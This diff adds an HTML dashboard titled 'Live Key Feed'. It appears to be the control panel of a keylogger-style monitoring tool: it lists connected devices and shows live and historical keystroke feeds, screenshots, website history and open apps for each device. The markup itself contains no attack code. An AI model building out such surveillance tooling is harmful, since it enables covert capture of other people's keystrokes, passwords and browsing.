@@ -1,0 +1,86 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Live Key Feed</title>
+  <link rel="stylesheet" href="/web/styles.css" />
+</head>
+<body>
+  <div class="app">
+    <div class="topbar">
+      <div class="brand"><span class="dot"></span> Live Key Feed</div>
+      <div class="topbar-status" aria-label="Service status">
+        <div class="topbar-metric">
+          <span class="topbar-metric-label">Started</span>
+          <span class="topbar-metric-value" id="startedAt">Loading...</span>
+        </div>
+        <div class="topbar-metric">
+          <span class="topbar-metric-label">Uptime</span>
+          <span class="topbar-metric-value" id="uptime">Loading...</span>
+        </div>
+        <div class="topbar-metric">
+          <span class="topbar-metric-label">Messages</span>
+          <span class="topbar-metric-value" id="messageCount">0</span>
+        </div>
+      </div>
+      <div class="topbar-meta">
+        <span>Realtime monitor</span>
+        <span class="stream-pill">Live stream</span>
+        <div class="support-menu">
+          <a class="support-link" id="supportLink" href="https://buymeacoffee.com/yourusername" target="_blank" rel="noopener noreferrer">Buy me a coffee</a>
+          <div class="payment-list" id="paymentList" aria-label="Other ways to support"></div>
+        </div>
+      </div>
+    </div>
+    <div class="workspace">
+      <aside class="devices-panel" aria-label="Connected devices">
+        <div class="devices-heading">
+          <h2>Devices</h2>
+          <span class="device-count" id="deviceCount">0</span>
+        </div>
+        <div class="device-summary">
+          <span class="online-count" id="onlineCount">0 online</span>
+          <span class="device-refresh" id="deviceUpdated">Checking...</span>
+        </div>
+        <div class="device-list" id="deviceList">
+          <span class="device-seen">Loading...</span>
+        </div>
+      </aside>
+      <section class="feed-panel">
+        <div class="status" id="status">Waiting for live streamâ€¦</div>
+        <div class="feed-toolbar">
+          <span id="scopeLabel">All devices</span>
+          <input class="message-search" id="messageSearch" type="search" placeholder="Search messages" aria-label="Search messages" />
+          <div class="view-switch" aria-label="Message view">
+            <button type="button" class="active" data-mode="filtered">Filtered</button>
+            <button type="button" data-mode="raw">Raw</button>
+            <button type="button" data-mode="raw-history">Raw history</button>
+            <button type="button" data-mode="screenshots">Screenshots</button>
+            <button type="button" data-mode="website-history">Website history</button>
+          </div>
+        </div>
+        <form class="raw-history-controls" id="rawHistoryControls" hidden>
+          <input id="rawDeviceFilter" type="text" placeholder="Device ID" aria-label="Device ID" />
+          <input id="rawSessionFilter" type="text" placeholder="Session ID" aria-label="Session ID" />
+          <input id="rawStartFilter" type="datetime-local" aria-label="Start time" />
+          <input id="rawEndFilter" type="datetime-local" aria-label="End time" />
+          <button type="submit">Load history</button>
+        </form>
+        <div class="feed" id="feed"></div>
+      </section>
+      <aside class="open-apps-panel" aria-label="Open applications">
+        <div class="open-apps-heading">
+          <h2>Open apps</h2>
+        </div>
+        <div class="open-apps-device" id="openAppsDevice">Select a device</div>
+        <ul class="open-apps-list" id="openAppsList">
+          <li>Select a device to view open apps</li>
+        </ul>
+      </aside>
+    </div>
+  </div>
+  <script type="module" src="/web/app.js"></script>
+</body>
+</html>
+
